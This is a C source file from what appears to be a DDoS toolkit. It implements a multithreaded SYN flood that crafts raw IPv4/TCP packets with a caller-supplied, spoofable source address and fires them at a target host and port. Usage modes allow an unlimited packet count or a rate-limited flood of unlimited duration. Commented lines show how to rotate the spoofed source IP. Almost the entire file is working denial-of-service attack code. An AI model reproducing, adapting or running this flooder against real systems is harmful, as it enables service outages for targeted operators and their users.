#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../ddos/syn_flood.h"

unsigned int tcpsyn_total;
unsigned int tcpsyn_produced;
unsigned int tcpsyn_received;

unsigned int tcpsyn_per_second;
unsigned int tcpsyn_duration;
double tcpsyn_elapsed_time;

char *tcpsyn_dest_ip;
char *tcpsyn_src_ip;
int tcpsyn_src_port;
int tcpsyn_dest_port;

int tcpsyn_generated_count;
short tcpsyn_timed_finisher;
pthread_mutex_t tcpsyn_mutex = PTHREAD_MUTEX_INITIALIZER;

pthread_cond_t tcpsyn_cond;

void syn_flood_print_usage(int mode) {

	if (mode == 1)
		printf(
				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Src-Port] [Dest-Port] \n");
	if (mode == 2)
		printf(
				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [duration (0 for INF)] [Src-Port] [Dest-Port]\n");
}

void* generate_syn_request1(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	while (1) {

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));

		/*** If you want to modify ip address*/
		//next_ip_addr(tcpsyn_src_ip, 1);
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, tcpsyn_src_port);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);

		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
		/***For SYN TCP request, ACK seq should not be provided.*/

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		printf("%d\n", ((struct iphdr*) packet)->tot_len);

		pthread_mutex_lock(&tcpsyn_mutex);

		if (tcpsyn_produced >= tcpsyn_total) {
			pthread_mutex_unlock(&tcpsyn_mutex);
			pthread_cond_broadcast(&tcpsyn_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
		tcpsyn_generated_count++;
		free(packet);
		tcpsyn_produced++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
}

void* generate_syn_request2(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	while (1) {
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));

		//modify tcpsyn_src_ip, increment 1.
		//next_ip_addr(tcpsyn_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, tcpsyn_src_port);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_total);
		//tcp_h = tcp_set_ack_seq(tcp_h,35623);

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		pthread_mutex_lock(&tcpsyn_mutex);

		if (tcpsyn_elapsed_time >= tcpsyn_duration) {
			pthread_mutex_unlock(&tcpsyn_mutex);
			pthread_cond_broadcast(&tcpsyn_cond);
			tcpsyn_timed_finisher=1;
			return 0;
		}

		if (tcpsyn_produced == tcpsyn_per_second) {
			pthread_cond_wait(&tcpsyn_cond, &tcpsyn_mutex);
		}

		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
		tcpsyn_generated_count++;
		free(packet);
		tcpsyn_produced++;
		tcpsyn_total++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
}

void* syn_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1, t2;
	t1 = clock();
	clock_t elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&tcpsyn_mutex);
		if(tcpsyn_timed_finisher==1) return 0;
		t2 = clock();
		time_taken = ((double) (t2 - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			tcpsyn_produced = 0;
			t1 = clock();
			time_taken = 0;
			tcpsyn_elapsed_time = ((double) (t1 - elapsed_time))
					/ CLOCKS_PER_SEC;
			pthread_cond_signal(&tcpsyn_cond);
		}
		pthread_mutex_unlock(&tcpsyn_mutex);
	}
}

void syn_flood_run(char *argv[], int mode) {

	tcpsyn_src_ip = (char*) malloc(sizeof(char) * 20);

	int argc = 0;
	tcpsyn_generated_count = 0;
	tcpsyn_timed_finisher=0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 6) {
		syn_flood_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 7) {
		syn_flood_print_usage(mode);
		return;
	}

	strcpy(tcpsyn_src_ip, argv[0]);

	tcpsyn_produced = 0;
	if (mode == 1) {
		tcpsyn_total = atoi(argv[3]);
		tcpsyn_src_port = atoi(argv[4]);
		tcpsyn_dest_port = atoi(argv[5]);

		if (tcpsyn_total == 0)
			tcpsyn_total = __UINT_MAXIMUM__;

	}

	if (mode == 2) {
		tcpsyn_total = 0;
		tcpsyn_per_second = atoi(argv[3]);
		tcpsyn_duration = atoi(argv[4]);
		if (tcpsyn_duration == 0)
			tcpsyn_duration = __UINT_MAXIMUM__;



		if (tcpsyn_per_second == 0)
			tcpsyn_per_second = __UINT_MAXIMUM__;

		tcpsyn_src_port = atoi(argv[5]);
		tcpsyn_dest_port = atoi(argv[6]);
	}

	int num_threads = atoi(argv[2]);

	tcpsyn_dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));
	int i;

	printf("Sending SYN requests to %s using %d threads\n", tcpsyn_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_syn_request1,
					(void*) &generate_thread_id[i]);
		if (mode == 2)
			pthread_create(&generate_thread[i], NULL, generate_syn_request2,
					(void*) &generate_thread_id[i]);
	}

	if (mode == 2) {
		pthread_create(&generate_thread[i], NULL, syn_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	printf("SYN flood finished\nTotal %d packets sent.\n",tcpsyn_generated_count);

	pthread_mutex_destroy(&tcpsyn_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(tcpsyn_src_ip);
	return;
}

